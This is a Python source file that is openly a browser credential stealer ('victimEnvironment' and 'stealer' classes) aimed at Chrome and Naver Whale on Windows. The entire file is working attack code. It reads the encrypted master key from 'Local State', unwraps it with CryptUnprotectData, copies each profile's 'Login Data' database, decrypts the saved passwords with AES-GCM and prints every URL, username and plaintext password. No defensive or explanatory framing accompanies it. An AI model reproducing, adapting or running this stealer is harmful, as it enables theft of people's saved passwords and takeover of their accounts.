import os
import base64
import json
import shutil
import sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import Dict,List

# Define the victim environment, and the path to the file to be stolen
class victimEnvironment:
    def __init__(self):
        self.appdataLocalPath = os.getenv('LOCALAPPDATA')
        self.browserPath:Dict[str, str] = {
            "chrome": f"{self.appdataLocalPath}\\Google\\Chrome\\User Data",
            "whale":  f"{self.appdataLocalPath}\\Naver\\Naver Whale\\User Data",
        }
        self.browserCredentialInformation:Dict[str, Dict[str, str]] = {
            "loginData": {
                "query": "SELECT action_url, username_value, password_value FROM logins",
                "subPath": "\\Login Data"
            }
        }

    # Under the "...\\User Data" directory, there are some profile directories like "Profile 1", "Profile 2", "Profile 3", ...
    def searchProfiles(self, browserPath: str) -> List[str]:
        directoryEntries:List[str] = os.listdir(browserPath)
        profileDirectories:List[str] = []
        for directory in directoryEntries:
            if directory.startswith("Profile "):
                profileDirectories.append(directory)
        return profileDirectories

    # Check if the browser is installed
    def checkBrowserInstallation(self) -> List[str]:
        existingBrowser:List[str] = []
        for browser in self.browserPath:
            if os.path.exists(self.browserPath[browser]):
                existingBrowser.append(browser)
            else:
                continue
        return existingBrowser

    # Get master key from the victim's environment
    def getMasterKey(self, browserPath: str) -> str:
        if not os.path.exists(browserPath):
            raise Exception(f"[!] {browserPath} does not exist")
        
        localStatePath:str = f"{browserPath}\\Local State"
        if "os_crypt" not in open(localStatePath, "r", encoding = "utf-8").read():
            raise Exception(f"[!] os_crypt not found in {localStatePath}")

        with open(localStatePath, "r", encoding = "utf-8") as localStateStream:
            c:bytes = localStateStream.read()
            localState:json = json.loads(c)
            masterKey:str = base64.b64decode(localState["os_crypt"]["encrypted_key"])
            masterKey = masterKey[5:]
            masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
            return masterKey

# Perform the stealing
class stealer:
    def __init__(self):
        pass

    # Decrypt the password using the master key
    def decryptPassword(self, buffer: bytes, masterKey: bytes) -> str:
        try:
            iv:bytes = buffer[3:15]
            payload:bytes = buffer[15:]
            cipher:AES = AES.new(masterKey, AES.MODE_GCM, iv)
            decryptedPassword:bytes = cipher.decrypt(payload)
            decryptedPassword:str = decryptedPassword[:-16].decode()
            return decryptedPassword
        except Exception as e:
            raise Exception(f"[!] Error while decrypting the password: {e}")

    # Obtain data
    def getData(self, dbPath: str, sqlQuery: str, masterKey: bytes) -> List[str]:
        try:
            shutil.copy2(dbPath, "./tmp.db")
            db:sqlite3.Connection = sqlite3.connect("./tmp.db")
            cursor:sqlite3.Cursor = db.cursor()
            cursor.execute(sqlQuery)
            data:List[str] = cursor.fetchall()
            for row in data:
                url:str = row[0]
                username:str = row[1]
                encryptedPassword:bytes = row[2]
                decryptedPassword:str = self.decryptPassword(encryptedPassword, masterKey)
                print(f"[+] - URL: {url}")
                print(f"[+] - Username: {username}")
                print(f"[+] - Password: {decryptedPassword}")
            db.close()
            os.remove("./tmp.db")
        except Exception as exception:
            print(f"[!] {exception}")


if __name__ == "__main__":
    victim = victimEnvironment()
    stealer = stealer()
    existingBrowsers:List[str] = victim.checkBrowserInstallation()
    for browser in existingBrowsers:
        print(f"[+] {browser} is installed")
        print(f"[+] master key: {victim.getMasterKey(victim.browserPath[browser])}")
        
        # get profile
        profileList:List[str] = victim.searchProfiles(victim.browserPath[browser])
        print(f"[+] {browser} has {len(profileList)} profile(s)")

        # get data
        for profile in profileList:
            print(f"[+] - Profile: {profile}")
            stealer.getData(dbPath = f"{victim.browserPath[browser]}\\{profile}\\{victim.browserCredentialInformation['loginData']['subPath']}", 
                            sqlQuery = victim.browserCredentialInformation['loginData']['query'],
                            masterKey = victim.getMasterKey(victim.browserPath[browser]))